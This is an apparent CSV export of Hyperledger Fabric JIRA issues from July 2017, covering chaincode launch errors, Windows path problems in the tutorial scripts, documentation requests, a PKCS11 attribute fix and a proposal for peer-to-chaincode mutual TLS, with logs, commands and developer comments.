2017-07-19 20:12:36.558 UTC [chaincode] Launch -> ERRO e1f launchAndWaitForRegister failed Error chaincode is being launched: sample_cc_ch1:v0
2017-07-19 20:12:36.558 UTC [chaincode] ExecuteChaincode -> ERRO e20 Error executing chaincode: Error chaincode is being launched: sample_cc_ch1:v0
2017-07-19 20:12:36.558 UTC [endorser] simulateProposal -> ERRO e21 failed to invoke chaincode name:""sample_cc_ch1""  on transaction 8bf90f7c6724f45ceb184fe30af46c615d2d7ac7cc0a17d9745fb0e7364158be, error: Error executing chaincode: Error chaincode is being launched: sample_cc_ch1:v0
2017-07-19 20:12:36.561 UTC [chaincode] ExecuteChaincode -> ERRO e22 Error executing chaincode: premature execution - chaincode (sample_cc_ch1:v0) is being launched
{code}




 

 ",,muralisr,suryalnvs,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"25/Jul/17 5:12 AM;suryalnvs;chaincode_support.go;https://jira.hyperledger.org/secure/attachment/11764/chaincode_support.go","21/Jul/17 5:16 AM;suryalnvs;peer0org2.txt;https://jira.hyperledger.org/secure/attachment/11740/peer0org2.txt","21/Jul/17 5:22 AM;suryalnvs;samplecc-chan1-longrun-i-TLS.json;https://jira.hyperledger.org/secure/attachment/11741/samplecc-chan1-longrun-i-TLS.json",,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy97b:",,,,,,,,,,,,,,,,,,,,,,,muralisr,suryalnvs,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,release-1.0,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"21/Jul/17 5:19 AM;suryalnvs;Tried by changing the gossip parameters a bit, disabled gossip by making all the peers as orgLeaders, issue still persists. ;;;","23/Jul/17 6:16 AM;muralisr;[~suryalnvs] Just as the app sends sends 1 ""instantiate"" TX to peer0/Org1 which also brings up the chaincode there , before starting the perf test, can we send 1 ""invoke"" to peer0/Org2 which will bring up the chaincode on there ? If that works, this will be a good work around with which you can do the rest of performance testing.;;;","24/Jul/17 2:17 AM;Clayton Sims;Sunday checkpoint status: Root cause determined.   Per Murali, straightforward fix.   HSBN already uses workaround above.   ;;;","25/Jul/17 5:13 AM;suryalnvs;With changes in [^chaincode_support.go] given by [~muralisr], ran the concurrency tests with 6 orgs, 3 channels (2 orgs per 1 channel) and sent transactions to each organization with 4 and 8 threads and issue is not reproducible.;;;","25/Jul/17 11:51 AM;wlahti;CR submitted to gerrit: https://gerrit.hyperledger.org/r/#/c/11889/;;;","25/Jul/17 9:52 PM;muralisr;A bit of background... we were doubling the chaincode registration flag to do exactly this (""in progress""). when we narrowed the gap to register a chaincode just before launching the container (preLaunchSetup) that flag got moved.  When a bunch of invokes came in at the same time the thundering herd went into a ""launch/cleanup... launch/cleanup"" sequence.  The new ""in progress"" fixes simply restores old behavior while at the same time preserves the security of setting the registration at the time of container start up;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Error with Writing Your First Application tutorial,FAB-5392,19371,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,mastersingh24,pollockt,pollockt,20/Jul/17 7:47 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,20/Jul/17 10:36 PM,v1.0.0,,,,,fabric-docs,fabric-samples,,,,,0,,,,,,,"Hi,

I'm getting an error when working through the instructions found on this page:

https://hyperledger-fabric.readthedocs.io/en/latest/write_first_app.html|http://example.com

I've installed the prerequisites (for Windows 10), pulled down the samples and successfully run the Building Your First Network example.

The output when running fabric-samples/fabcar/startFabric.sh in a bash shell is:

Tim@DESKTOP-ER6JS0I MINGW64 /c/Development/Hyperledger/fabric-samples/fabcar (release)
$ ./startFabric.sh

docker-compose -f docker-compose.yml down
Stopping peer0.org1.example.com ... done
Stopping orderer.example.com ... done
Stopping ca.example.com ... done
Stopping couchdb ... done
Removing peer0.org1.example.com ... done
Removing orderer.example.com ... done
Removing ca.example.com ... done
Removing couchdb ... done
Removing network net_basic

docker-compose -f docker-compose.yml up -d ca.example.com orderer.example.com peer0.org1.example.com couchdb
Creating network ""net_basic"" with the default driver
Creating ca.example.com ...
Creating orderer.example.com ...
Creating couchdb ...
Creating ca.example.com
Creating couchdb
Creating orderer.example.com ... done
Creating ca.example.com ... done
Creating peer0.org1.example.com ... done

# wait for Hyperledger Fabric to start
# incase of errors when running later commands, issue export FABRIC_START_TIMEOUT=<larger number>
export FABRIC_START_TIMEOUT=10
#echo $\{FABRIC_START_TIMEOUT}
sleep $\{FABRIC_START_TIMEOUT}

# Create the channel
docker exec -e ""CORE_PEER_LOCALMSPID=Org1MSP"" -e ""CORE_PEER_MSPCONFIGPATH=/etc/hyperledger/msp/users/Admin@org1.example.com/msp"" peer0.org1.example.com peer channel create -o orderer.example.com:7050 -c mychannel -f /etc/hyperledger/configtx/channel.tx
2017-07-19 19:25:52.316 UTC [main] main -> ERRO 001 Cannot run peer because cannot init crypto, missing /etc/hyperledger/fabric/C:/Program Files/Git/etc/hyperledger/msp/users/Admin@org1.example.com/msp folder


The startFabric.sh script executes ../basic-network/start.sh, and I'm getting that same error when I run that script directly.

As you can see, the path doesn't look right:

/etc/hyperledger/fabric/C:/Program Files/Git/etc/hyperledger/msp/users/Admin@org1.example.com/msp

Any ideas how to get beyond this issue?

Thanks,
Tim",Windows 10,mastersingh24,pollockt,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy97j:",,,,,,,,,,,,,,,,,,,,,,,mastersingh24,pollockt,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-6.11.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/tough-cookie-4.1.3,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/semver-6.3.1,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/grpc/grpc-js-1.8.17,dependabot/go_modules/high-throughput/application-go/google.golang.org/grpc-1.53.0,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/word-wrap-1.2.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-and-fabric-network-7.2.4,dependabot/go_modules/asset-transfer-basic/application-go/google.golang.org/grpc-1.53.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"20/Jul/17 6:43 PM;mastersingh24;The issue is caused by a ""helpful"" feature of mingw64 / msys (which is what is used by Git Bash for Windows).
 
You should be able to resolve the issue by running
 
export MSYS_NO_PATHCONV=1
./startFabric.sh
 
For details on what is actually happening, you can checkout [http://www.mingw.org/wiki/Posix_path_conversion] and in the table look at the foo=bar example;;;","20/Jul/17 9:27 PM;mastersingh24;https://gerrit.hyperledger.org/r/11773;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Introduce Delay as configurable variable,FAB-5394,19374,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,harsha544,harsha544,harsha544,20/Jul/17 5:30 PM,21/Jul/18 3:56 AM,28/Oct/23 3:00 AM,04/Aug/17 10:38 PM,,,,,,fabric-samples,,,,,,0,,,,,,,Introduce delay as configurable variable (with a default of 3 seconds) for byfn.sh,,harsha544,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy97z:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,harsha544,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-6.11.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/tough-cookie-4.1.3,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/semver-6.3.1,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/grpc/grpc-js-1.8.17,dependabot/go_modules/high-throughput/application-go/google.golang.org/grpc-1.53.0,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/word-wrap-1.2.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-and-fabric-network-7.2.4,dependabot/go_modules/asset-transfer-basic/application-go/google.golang.org/grpc-1.53.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"24/Jul/17 11:20 PM;harsha544;Submitted a patch https://gerrit.hyperledger.org/r/#/c/11769/ .
Awaiting response.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Indentations in proto files are not consist,FAB-5396,19377,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,fennelD7,fennelD7,fennelD7,20/Jul/17 8:36 PM,21/Jul/18 3:54 AM,28/Oct/23 3:00 AM,10/Oct/17 10:06 AM,,,,,,,,,,,,0,,,,,,,,,fennelD7,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy98f:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,fennelD7,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"20/Jul/17 8:39 PM;fennelD7;https://gerrit.hyperledger.org/r/#/c/11771/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
How to get the node SDK to read the cryptogen identity info from disk for first-network sample in Fabric Samples ,FAB-5397,19381,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,gauthampamu,gauthampamu,20/Jul/17 10:02 PM,10/Jan/20 4:33 AM,28/Oct/23 3:00 AM,10/Jan/20 4:33 AM,,,,,,fabric-docs,fabric-samples,,,,,0,,,,,,,"The first-network sample in fabric samples creates user User1 and Admin. I wanted to understand how to use these users from Nodejs application. It creates keystore, signercerts,admincerts and cacerts. How should we use these certs to login to the network to invoke or execute the query. In the wallet folder for fabcar, we have three files but here we have the keystore which is priv key and signercerts is the public key, how should we create the other file (like PeerAdmin in fabcar/cred) or do we need that file for the Nodejs application.

It would be helpful to have documentation on how to get the node SDK to read the cryptogen identity info from disk

[https://chat.hyperledger.org/channel/fabric-documentation?msg=beYSWwxB82yeJgiT6]
[https://fabric-sdk-node.github.io/User.html#setEnrollment__anchor]
[https://fabric-sdk-node.github.io/Client.html#setUserContext__anchor]",,gauthampamu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy98n:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,gauthampamu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Document npm install as root user not supported,FAB-5398,19382,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,harrisob@us.ibm.com,jimthematrix,jimthematrix,20/Jul/17 11:01 PM,21/Jul/18 3:57 AM,28/Oct/23 3:00 AM,06/Mar/18 3:06 AM,,,,v1.1.0,,fabric-docs,,,,,,0,,,,,,,https://stackoverflow.com/questions/45193218/npm-fails-installing-fabric-ca-client,,denyeart,harrisob@us.ibm.com,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzx493:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,denyeart,harrisob@us.ibm.com,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dev,main,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"10/Nov/17 6:23 AM;harrisob@us.ibm.com;[~nickgaski] could you add this somewhere to the doc about NodeSDK, thanks;;;","15/Feb/18 2:35 AM;denyeart;[~harrisob@us.ibm.com] Since doc team is stretched, could you take this one?;;;","01/Mar/18 5:45 AM;harrisob@us.ibm.com;https://gerrit.hyperledger.org/r/#/c/18561/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Prerequisites section of tutorial should include installing OpenSSL,FAB-5399,19383,,Story,Closed,FAB,Fabric,software,denyeart,,,Low,Done,luomin,pollockt,pollockt,20/Jul/17 11:51 PM,21/Jul/18 3:56 AM,28/Oct/23 3:00 AM,20/Jul/18 7:16 AM,v1.1.0,,,Future,,fabric-docs,,,,,,0,,,,,,,"I encountered an error when running ""npm install"" as defined in the ""Writing Your First Application"" tutorial.  The error indicated that OpenSSL was not installed.  Installing it fixed the error.

The Prerequisites page (https://hyperledger-fabric.readthedocs.io/en/latest/prereqs.html) should include a step to install OpenSSL.

BTW, I installed version 1_0_2.  Version 1.1.0 did not work.
",,kchristidis,pollockt,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy98v:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,kchristidis,pollockt,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"08/May/18 12:03 PM;kchristidis;CR abandoned due to inactivity: https://gerrit.hyperledger.org/r/c/14043/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Consistently use ""I"" instead of ""we"" in step descriptions",FAB-5402,19388,19362,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,latitiah,latitiah,latitiah,21/Jul/17 2:56 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,11/Aug/17 10:59 PM,,,,,,fabric-quality,,,,,,0,quality,,,,,,"Per a comment in CR https://gerrit.hyperledger.org/r/#/c/11713/1, we should be consistent in our pronoun usage in the behave step descriptions.",,latitiah,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy99j:",,,,,,Sprint 19 - Quality,,,,,,,,,,,,,,,,,latitiah,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
PTE cleans up unused parameters,FAB-5404,19390,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,dongming,dongming,dongming,21/Jul/17 3:51 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,03/Aug/17 11:12 PM,,,,,,fabric-quality,,,,,,0,quality,,,,,,"Clean up all unused parameters: nOrderer, nOrg, nPeer, and nPeerPerOrg.  These information are obtained from the config json located in SCFile directory.",,dongming,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-2247,,,,,,,,,"1|hzy99z:",,,,,,,,,,,,,,,,,,,,,,,dongming,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Peer<-->Chaincode Mutual TLS,FAB-5406,19392,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,yacovm,yacovm,21/Jul/17 4:49 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,22/Aug/17 7:50 PM,v1.0.0,,,v1.1.0,,fabric-crypto,,,,,,0,,,,,,,"In order to harden and secure the communication and authentication (specifically - association between the chaincode name to the gRPC stream) between the peer and the chaincode shim - we should use mutual TLS.

I propose the following flow:
* The peer chaincode gRPC service would always run on a different port
* At peer startup - it will generate a CA cert, and put it into the chaincode gRPC service's TLS CA cert pool
* When a chaincode container is launched, the peer would generate a new TLS certificate and private key pair and would sign it with the CA cert's corresponding private key.
* The peer would associate the chaincode instance's name with the certificate hash, and start a timer after which the association is deleted from memory.
* The peer's chaincode gRPC service would use the configuration - [RequireAndVerifyClientCert|https://golang.org/src/crypto/tls/common.go?s=5991:6014#L175]
* The certificate would be passed to the container via either environment variables, or commandline arguments or via some other secure method ( [~ales] / [~mastersingh24]
*  - what is your take on this? which one is better?)
* The chaincode shim would connect to the peer using the certificate (and corresponding private key) passed to it upon initialization
* The peer would intercept the first message from the chaincode shim (REGISTER <chaincode_name>) and check that the certificate hash extracted from the gRPC stream exists in the in-memory mapping, and also matches the claimed chaincode name sent by the chaincode shim. If it isn't - the peer would not pass the message and block the stream / disconnect it.",,angelo.decaro,baohua,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-4894,,,,,FAB-4751,,,,FABCJ-163,FAB-8757,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy9a7:",,,,,,,,,,,,,,,,,,,,,,,angelo.decaro,baohua,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"07/Aug/17 9:54 AM;angelo.decaro;So, https://gerrit.hyperledger.org/r/#/c/11929/ has been merged but it does not use BCCSP for the crypto operation and the package name *accesscontrol* is just misleading in my opinion. [~elli-androulaki][~ales], what's your take on this?;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix issue with pubkey pkcs11 attribute CKA_PRIVATE in BCCSP lib,FAB-5407,19393,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,gbolo,gbolo,gbolo,21/Jul/17 4:53 AM,18/Dec/19 3:05 AM,28/Oct/23 3:00 AM,29/Jul/17 4:18 AM,v1.0.0,,,v1.0.1,,fabric-orderer,fabric-peer,,,,,0,bccsp,,,,,,"According to PKCS11 standard:
CKA_PRIVATE - CK_BBOOL - TRUE if object is a private object (vs. public object) (default FALSE)

Changing this to FALSE for public key pkcs11 attribute struct fixed an issue we were having with our Thalas HSM: CKR_TEMPLATE_INCONSISTENT

Commenting out this line also works (since there is no reason for it to be in the pubkey struct). Please also vendor in this change to other projects using it, such as Fabric-CA.

 

https://github.com/hyperledger/fabric/blob/release/bccsp/pkcs11/pkcs11.go#L242",,angelo.decaro,gbolo,mastersingh24,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5530,,,,,,,,,,,,,,,,,,,,FAB-17280,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy9af:",,,,,,,,,,,,,,,,,,,,,,,angelo.decaro,gbolo,mastersingh24,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,release-1.0,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"21/Jul/17 5:10 AM;gbolo;Submitted a commit:

commit c97a93a579a55ed4b3e5d1ed03b8620a8a1d90e0
Author: gbolo <george.bolo@gmail.com>
Date: Thu Jul 20 15:00:31 2017 -0400

[FAB-5407] Fix issue with pubkey pkcs11 CKA_PRIVATE
 
 According to PKCS11 standard:
 CKA_PRIVATE - CK_BBOOL - TRUE if object is a private
 object (vs. public object) (default FALSE)
 
 Changing this to FALSE for public key pkcs11 attribute struct
 fixed an issue we were having with our Thalas HSM: CKR_TEMPLATE_INCONSISTENT
 
 Commenting out this line also works
 (since there is no reason for it to be in the pubkey struct).
 Please also vendor in this change to other projects using it,
 such as Fabric-CA.
 
 Change-Id: I87d363a89e34c39f438492123166ed59eb515c44
 Signed-off-by: gbolo <george.bolo@gmail.com>;;;","21/Jul/17 5:19 AM;yacovm;[~vpaprots] , [~adc] ^ ;;;","21/Jul/17 10:24 AM;angelo.decaro;[~gbolo], thanks a lot for having spotted that. [~vpaprots], may you address that, please?;;;","21/Jul/17 7:38 PM;mastersingh24;https://gerrit.hyperledger.org/r/#/c/11791/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Error creating channel,FAB-5411,19401,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,sky5217285,sky5217285,21/Jul/17 12:40 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,15/Feb/18 2:16 AM,,,,,,fabric-samples,,,,,,0,,,,,,,"when i run fabric/examples/configtxupdate/reconfig_membership/script.sh,errer happened.

#####################################################
Submitting channel create tx to orderer
#####################################################

Executing:
 ./../common_scripts/../../../build/bin/peer channel create -f 'example_output/channel_create_tx.pb' -c 'example' -o '127.0.0.1:7050'

#####################################################
FAILURE: Error creating channel
#####################################################",,denyeart,jyellick,mastersingh24,sky5217285,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy9bj:",,,,,,,,,,,,,,,,,,,,,,,denyeart,jyellick,mastersingh24,sky5217285,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"16/Sep/17 10:19 PM;mastersingh24;[~sky5217285] - Can you provide some more details on your setup?  Would also be helpful to see the logs for the orderer as well;;;","27/Nov/17 1:12 PM;denyeart;[~sky5217285] Can you provide more details and logs?
[~jyellick] Any ideas?;;;","28/Nov/17 3:51 AM;jyellick;Most likely, the orderer has not been bootstrapped with the correct profile (or is not running).;;;","14/Feb/18 3:55 AM;Clayton Sims;[~sky5217285]  are you able to provide the info?   moving to hold/monitor status which means we are waiting on the originator;;;","15/Feb/18 2:16 AM;denyeart;Not believed to be a defect and have not heard back from reporter, Closing for now.

If you can still reproduce the issue, please re-open.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Unable to start networkError response from daemon: No such container: cli,FAB-5412,19402,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,RichardHill,RichardHill,21/Jul/17 2:57 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,01/Aug/17 9:34 PM,v1.0.0,,,,,fabric-samples,,,,,,0,,,,,,,"I am unable to start network. 
The fabric docker repo does not have latest tag, this is expected behavior by hyperleder but the script uses 'latest' tag

{quote}""manifest for hyperledger/fabric-orderer:latest not found""
""Error response from daemon: No such container: cli.""
{quote}

I expect i need to tag  the fabric-orderer image and other  as latest in my local machine. 

 docker tag 5ec6333eae10 hyperledger/fabric-orderer:latest


*Versions*

fabric-samples.git

commit 1153988540a66319814dcc20e7c384f6429bd0ce
Merge: d9e2d5c 6422fc3

*Docker* 

Docker version 17.06.0-ce, build 02c1d87

*Docker images
*hyperledger/fabric-tools x86_64-1.0.0-rc1  85d6d3ca0a30
hyperledger/fabric-couchdb x86_64-1.0.0-rc1  b37a08f8a0cb
hyperledger/fabric-orderer x86_64-1.0.0-rc1  5ec6333eae10
hyperledger/fabric-peer x86_64-1.0.0-rc1  cf6bedc2935e
hyperledger/fabric-ccenv x86_64-1.0.0-rc1  13ed472038d2


*Steps*
Install repo and prerequisites as described here.
https://hyperledger-fabric.readthedocs.io/en/latest/build_network.html


{{ /fabric-samples/first-network$ ./byfn.sh -m generate

 /fabric-samples/first-network$ ./byfn.sh -m up
Starting with channel 'mychannel' and CLI timeout of '10000'
Continue (y/n)? 
invalid response
Continue (y/n)? 
invalid response
Continue (y/n)? y
proceeding ...
Creating network ""net_byfn"" with the default driver
Pulling orderer.example.com (hyperledger/fabric-orderer:latest)...
ERROR: manifest for hyperledger/fabric-orderer:latest not found
ERROR !!!! Unable to start network
Error response from daemon: No such container: cli
}}",,ChristopherFerris,RichardHill,ShimingLiu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy9br:",,,,,,,,,,,,,,,,,,,,,,,ChristopherFerris,RichardHill,ShimingLiu,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-6.11.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/tough-cookie-4.1.3,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/semver-6.3.1,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/grpc/grpc-js-1.8.17,dependabot/go_modules/high-throughput/application-go/google.golang.org/grpc-1.53.0,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/word-wrap-1.2.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-and-fabric-network-7.2.4,dependabot/go_modules/asset-transfer-basic/application-go/google.golang.org/grpc-1.53.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"23/Jul/17 5:41 AM;ChristopherFerris;[~RichardHill] Did you install the binaries and docker images using the curl command as described [here|[http://hyperledger-fabric.readthedocs.io/en/latest/samples.html#download-platform-specific-binaries]?] I just ran this and the orderer was correctly labeled as 'latest'.;;;","23/Jul/17 5:57 AM;ChristopherFerris;Adding a 'fabric-preload.sh' to the samples repo to allow users to download/tag images w/o the curl option.;;;","23/Jul/17 5:59 AM;ChristopherFerris;https://gerrit.hyperledger.org/r/11843;;;","01/Feb/18 4:11 PM;ShimingLiu;[~ChristopherFerris] hi, I just met the same problem as this issue described, I followed this document 